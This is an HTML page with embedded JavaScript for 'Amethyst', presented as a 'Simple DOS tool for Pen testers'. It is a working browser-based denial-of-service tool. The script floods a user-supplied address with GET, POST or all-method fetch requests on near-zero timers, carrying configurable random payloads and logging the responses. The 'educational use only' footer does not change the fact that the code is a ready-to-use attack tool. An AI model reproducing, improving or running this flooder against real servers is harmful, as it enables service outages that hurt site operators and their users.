<!DOCTYPE html>
<html>
<head>
  <title>Amethyst</title>
  <style>
    body {
      padding: 0px 2vw;
      color: #EEE;
      font-size: 20px;
      font-family: Arial, sans-serif;
      color-scheme: dark;
      text-shadow: 0 5px 20px rgba(0,0,0,0.8);
      background: #222;
    }
	
	#a-addrinp {
		width: 80vw;
	}
	
    textarea {
       height: 80vh;
       width: 80vw;
       color: green;
       font-family: monospace;
       border: none;
       border-radius: 0;
    }
    
    /*Begin PacifikyNeoDark*/
    :root {
      --hover: #4f4f4f;
      --border: 2px;
      --radius: 45px;
      --height: 6px;
    }
    input:focus,select:focus,textarea:focus {outline:none;}
    input:active,select:active,input[type="text"]:focus,.button:active {background-image: linear-gradient(to left top, #292929, #121212)};
    .button,input,select {font-family: Tahoma, Arial, sans-serif;}
    input:active,select:active,input[type="text"]:focus,.button:active {
      box-shadow: 2px 2px var(--height) rgba(0,0,0,0.7) inset, -2px -2px var(--height) rgba(240,240,240,0.3) inset;
      border-color: rgba(0,0,0,0);
    }
    details,input,select,.button,.fp-grad-stop-cont-cont {border: var(--border) #292929 solid;box-shadow: 2px 2px var(--height) rgba(0,0,0,0.7), -2px -2px var(--height) rgba(240,240,240,0.3);}
    input,select {
      transition: box-shadow 500ms ease, border 500ms ease;
      background-image: linear-gradient(to left top, #121212, #292929);
      color: currentcolor;
      font-size: 13px;
      padding: 10px;
      margin: 5px;
      border-radius: var(--radius);
      min-width:0px;
    }
    select {background-color:#222;padding:5px;}
    input:hover,select:hover,.button:hover {border-color: var(--hover);}
    .smallinput {width:10em}
    .button {
      display: inline-flex;
      flex-direction: row;
      justify-content: center;
      align-content: center;
      align-items: center;
      cursor: pointer;
      background-image: linear-gradient(to left top, #121212, #292929);
      color: currentColor;
      transition: box-shadow 500ms ease, border 500ms ease;
      font-size: 13px;
      padding: 8px;
      margin: 4px;
      border-radius: var(--radius);
      min-width: 100px;
    }
    .iconbutton {
      min-width: 0;
      width: 45px;
      height: 45px;
      font-size: 30px;
      border-radius: 50%;
      font-weight: bold;
      text-shadow: 0 0 5px rgba(0,0,0,0.5);
    }
    .icon {
      display: inline;
      height: 25px;
      width: 25px;
    }
    hr {
	  border-color: #3d3d3d;
	}
    .smallbutton {min-width:5em;}
    details {
      border-radius: 20px;
      padding: 10px;
      margin: 10px;
      /*background: linear-gradient(to left top, #121212, #292929);*/
    }
    details[open] > summary {
      border-bottom: rgba(255,255,255,0.2) solid 2px;
      margin-bottom: 10px;
    }
    .gbtn {
      background: linear-gradient(135deg,#33ff33,#11c011);
      box-shadow: 2px 2px var(--height) rgba(0,0,0,0.8),-2px -2px var(--height) #33ff33;
      border-color:#11c011;
    }
    .gbtn:hover {border-color:#33ff33;}
    .gbtn:active {background: linear-gradient(-45deg,#33ff33,#11c011);box-shadow: inset 2px 2px var(--height) rgba(0,0,0,0.8),inset -2px -2px var(--height) #33ff33;}
    .rbtn {
      background: linear-gradient(135deg,#f95353,#a51212);
      box-shadow: 2px 2px var(--height) rgba(0,0,0,0.8),-2px -2px var(--height) #f95353;
      border-color: #a51212;
    }
    .rbtn:hover {border-color: #f95353}
    .rbtn:active {background: linear-gradient(-45deg,#f95353,#a51212);box-shadow: inset 2px 2px var(--height) rgba(0,0,0,0.8), inset -2px -2px var(--height) #f95353;}
	
	label {
	  font-weight: 600;
	  font-size: 12px;
	}
	
	.switch {
	  position: relative;
	  display: inline-block;
	  width: 45px;
	  height: 25px;
	  margin: 0px 3px 0px 0px;
	}
	
	.switch input {
	  opacity: 0;
	  width: 0;
	  height: 0;
	}
	
	.slider {
	  position: absolute;
	  cursor: pointer;
	  top: 0;
	  left: 0;
	  right: 0;
	  bottom: 0;
	  background: linear-gradient(to left top, #8c8c8c, #b0b0b0);
	  box-shadow: 2px 2px var(--height) rgba(0,0,0,0.7), -2px -2px var(--height) rgba(240,240,240,0.3), #6a6a6a 0px 1px inset;
	  -webkit-transition: .4s;
	  transition: .4s;
	}
	
	.slider:before {
	  position: absolute;
	  content: "";
	  height: 20px;
	  width: 20px;
	  left: 3px;
	  bottom: 3px;
	  background: linear-gradient(to left top, #babababa, #d1d1d1);
	  box-shadow: 2px 2px var(--height) rgba(0,0,0,0.7), -2px -2px var(--height) rgba(240,240,240,0.3);
	  -webkit-transition: .4s;
	  transition: .4s;
	}
	
	.switch input:checked + .slider {
	  background: linear-gradient(to right bottom, #424242, #6b6b6b);
	}
	
	.switch input:hover + .slider {
	  box-shadow: 2px 2px var(--height) rgba(0,0,0,0.7) inset, -2px -2px var(--height) rgba(240,240,240,0.3) inset;
	}
	
	.switch input:checked + .slider:before {
	  -webkit-transform: translateX(19px);
	  -ms-transform: translateX(19px);
	  transform: translateX(19px);
	}
	
	.slider.round {
	   border-radius: 34px;
	}
	
	.slider.round:before {
	  border-radius: 50%;
	}
	
	.sliderlabel {
	  margin: 5px;
	  text-align: left;
	}
	
	.slidercontainer {
	  display: flex;
	  justify-content: left;
	  margin: 5px;
	  font-size:  15px;
	}
    /*End PacifikyNeoDark*/
  </style>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
</head>

<body lang="en">
  <h1>Amethyst</h1>
  <h2>Simple DOS tool for Pen testers</h2>
  <div id="controls">
  <input type="text" id="a-addrinp"></input>
  <hr/>
  <div class="slidercontainer">
  <label class="switch">
    <input type="checkbox" id="a-logstatus" checked>
    <span class="slider round"></span>
  </label>
  <div class="vl"></div>
  <label for="a-logstatus" title="Log status of each request" class="sliderlabel">Log Status</label>
  </div>
  <select id="a-mode">
	  <option value="0">GET</option>
	  <option value="1">POST</option>
	  <option value="2">ALL METHODS</option>
  </select>
  Mode
  <br/>
  <input id="a-datasize" type="number" min="0" value="1000">Data Size (Bytes)</input>
  <br/>
  <button id="a-stabtn" class="button">Start</button>
  <button id="a-stobtn" class="button">Stop</button>
  <br/>
  <textarea id="a-log" placeholder="Amethyst Loading..."></textarea>
  </div>
  <footer>Copyright 2024 Pacifiky. All rights reserved.<br/>This software is designed for educational use only.</footer>
  <script>
    const addrinp = document.getElementById("a-addrinp");
    const stabtn = document.getElementById("a-stabtn");
    const stobtn = document.getElementById("a-stobtn");
    const log = document.getElementById("a-log");
	const logchk = document.getElementById("a-logstatus");
	const sizenum = document.getElementById("a-datasize");
	const modesel = document.getElementById("a-mode");
    class AmethystSys {
	    constructor(addrelm,staelm,stoelm,logelm,statuschk,modeelm,sizeelm){
		    this.addrelm = addrelm;
		    this.staelm = staelm;
		    this.stoelm = stoelm;
		    this.logelm = logelm;
		    this.modeelm = modeelm;
		    this.sizeelm = sizeelm;
			this.statuschk = statuschk;
		    this.running = false;
			this.logStatus = this.logStatus.bind(this);
		    this.startloop = this.startloop.bind(this);
		    this.endloop = this.endloop.bind(this);
		    this.updaddr = this.updaddr.bind(this);
		    this.updmode = this.updmode.bind(this);
		    this.steploopg = this.steploopg.bind(this);
		    this.steploopp = this.steploopp.bind(this);
		    this.steploop = this.steploop.bind(this);
		    this.upddata = this.upddata.bind(this);
		    this.addr = "";
		    this.currmode = 0;
		    this.mode = 0;
		    this.reqcount = 0;
		    this.intervalId = 0;
		    this.logbefore = "";
		    this.staelm.addEventListener("click",this.startloop);
		    this.stoelm.addEventListener("click",this.endloop);
		    this.addrelm.addEventListener("change",this.updaddr);
		    this.modeelm.addEventListener("change",this.updmode);
		    this.sizeelm.addEventListener("change",this.upddata);
		    this.log("Amethyst successfully initialized.");
			this.data = JSON.stringify({data:this.datagen(parseInt(this.sizeelm.value))});
			//alert(this.sizeelm.value);
			//this.log(this.data);
		    this.log("Amethyst ready");
			//alert(this.statuschk.checked);
	    }
	    startloop(){
		    if(this.running){
			    this.log("Loop already running!");
			    this.logbefore = this.logelm.value;
		    }else{
			    this.log("Loop started.");
			    this.currmode = this.mode;
			    this.log("Using mode " + this.currmode.toString());
			    this.reqcount = 0;
			    //alert(this.logbefore);
			    this.running = true;
			    switch(this.currmode){
				    case 0:
					    this.intervalId = setInterval(this.steploopg,0.00001);
					    break;
					case 1:
						this.intervalId = setInterval(this.steploopp,0.01);
						break;
					case 2:
						this.intervalId = setInterval(this.steploop,1);
						break;
			    }
			    this.log("Interval#" + this.intervalId.toString());
			    this.logbefore = this.logelm.value;
		    }
	    }
	    datagen(len){
		    let data = new Array(len);
		    for(let i=0;i<len;i++){
			    data[i] = String.fromCharCode(Math.floor(Math.random() * 255));
			}
			return data.join('');
	    }
	    endloop(){
		    if(this.running){
			    this.log("Sending stop req...");
			    this.running = false;
			    /*
			    switch(this.currmode){
				    case 0:
					    clearInterval(this.steploopg,0.1);
					    break;
					case 1:
						clearInterval(this.steploopp,0.1);
						break;
					case 2:
						clearInterval(this.steploop,1);
						break;
			    }
			    */
			    clearInterval(this.intervalId);
			    this.log("Loop ended.");
			    this.log("Interval#" + this.intervalId.toString());
			    this.log("Request count: " + this.reqcount.toString());
			    this.logbefore = this.logelm.value;
		    }else{
			    this.log("Loop already ended!");
			    this.logbefore = this.logelm.value;
		    }
	    }
	    steploop(){
		    if(this.statuschk.checked){
				//try{
				fetch(this.addr,{method:"POST",body:this.data,headers:{"Content-Type":"application/json"}}).then(req=>{this.logStatus(req,"POST ")});
				fetch(this.addr,{method:"GET",headers:{"User-Agent":"Amethyst/1.0","Connection":"Keep-Alive"}}).then(req=>{this.logStatus(req,"GET ")});
				fetch(this.addr,{method:"PUT",body:this.data,headers:{"Content-Type":"application/json"}}).then(req=>{this.logStatus(req,"PUT ")});
				fetch(this.addr,{method:"DELETE",body:this.data}).then(req=>{this.logStatus(req,"DELETE ")});
				fetch(this.addr,{method:"PATCH",body:this.data}).then(req=>{this.logStatus(req,"PATCH ")});
				fetch(this.addr,{method:"OPTIONS",body:this.data}).then(req=>{this.logStatus(req,"OPTIONS ")});
				fetch(this.addr,{method:"TRACE",body:this.data}).then(req=>{this.logStatus(req,"TRACE ")});
				fetch(this.addr,{method:"CONNECT",body:this.data}).then(req=>{this.logStatus(req,"CONNECT ")});
				fetch(this.addr,{method:"HEAD",body:this.data}).then(req=>{this.logStatus(req,"HEAD ")});
				/*
				*/
				//}catch(e){alert(e)}
		    }else{
				fetch(this.addr,{method:"POST",body:this.data,headers:{"Content-Type":"application/json"}})
				fetch(this.addr,{method:"GET",headers:{"User-Agent":"Amethyst/1.0","Connection":"Keep-Alive"}})
				fetch(this.addr,{method:"PUT",body:this.data,headers:{"Content-Type":"application/json"}})
				fetch(this.addr,{method:"DELETE",body:this.data})
				fetch(this.addr,{method:"PATCH",body:this.data})
				fetch(this.addr,{method:"OPTIONS",body:this.data})
				fetch(this.addr,{method:"TRACE",body:this.data})
				fetch(this.addr,{method:"CONNECT",body:this.data})
				fetch(this.addr,{method:"HEAD",body:this.data})
			}
			this.reqcount += 9;
	    }
	    steploopg(){
		    if(this.statuschk.checked){
				fetch(this.addr,{method:"GET",headers:{"User-Agent":"Amethyst/1.0","Connection":"Keep-Alive"}}).then(req=>{this.logelm.value = this.logbefore + "GET " + req.status + (req.ok ? " OK\n" : " ERR\n") + "Total: " + this.reqcount.toString() + "\n";});
		    }else{
				fetch(this.addr,{method:"GET",headers:{"User-Agent":"Amethyst/1.0","Connection":"Keep-Alive"}});
			}
			this.reqcount++;
	    }
	    steploopp(){
		    if(this.statuschk.checked){
				fetch(this.addr,{method:"POST",body:this.data,headers:{"Content-Type":"application/json"}}).then(req=>{this.logelm.value = this.logbefore + "POST " + req.status + (req.ok ? " OK\n" : " ERR\n") + "Total: " + this.reqcount.toString() + "\n";});
		    }else{
				fetch(this.addr,{method:"POST",body:this.data,headers:{"Content-Type":"application/json"}});
			}
			this.reqcount++;
	    }
		logStatus(req,met){
			this.logelm.value = this.logbefore + met + req.status + (req.ok ? " OK\n" : " ERR\n") + "Total: " + this.reqcount.toString() + "\n";
		}
	    updaddr(){
		    this.addr = this.addrelm.value;
		    this.log("Address set to: "+this.addr);
	    }
	    upddata(){
    	    //alert(this.sizeelm.value);
    	    const datalen = Math.max(parseInt(this.sizeelm.value),0);
    	    this.sizeelm.value = datalen.toString();
    	    this.data = JSON.stringify({data:this.datagen(datalen)});
    	    //alert(this.data)
    	    this.log("Data length set to: "+datalen.toString());
	    }
	    updmode(){
		    this.mode = parseInt(this.modeelm.value);
		    this.log("Mode set to: "+modeelm.value);
	    }
	    log(s){
		    this.logelm.value += s + "\n";
	    }
	    logclear(){
		    this.logelm.value = "";
	    }
    }
    try{
    const system = new AmethystSys(addrinp,stabtn,stobtn,log,logchk,modesel,sizenum);
    }catch(e){alert(e)}
  </script>
</body>
</html>